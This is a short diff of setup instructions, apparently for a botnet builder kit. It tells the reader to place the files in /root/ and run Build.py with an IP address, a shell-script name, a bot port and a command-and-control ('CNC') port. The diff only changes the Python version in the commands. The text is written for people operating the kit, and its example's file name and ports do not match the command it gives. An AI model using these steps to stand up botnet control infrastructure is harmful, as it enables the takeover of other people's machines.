@@ -2,11 +2,11 @@
 [+]===============================================================================[+]
 Setup: *THERE IS NO NEED TO EDIT/ADD ANYTHING IN ANY FILES BEFOREHAND
 	Load All Files Into /root/
-	Run: python Build.py
+	Run: python2.7 Build.py
 	It Will Display The Required Arguments
 	This Is Where You Choose What Ports You Want It Up On
 	If You Want Your SH File Named EkSgbins.sh, BotPort 666 and CNCPort 747:
-	Run: python Build.py 185.101.105.117 yoyo 576 69
+	Run: python2.7 Build.py 185.101.105.117 yoyo 576 69
 
 	That's It
 	If You Guys Can't Manage To Set This Up I'm Done Making Shit Lol
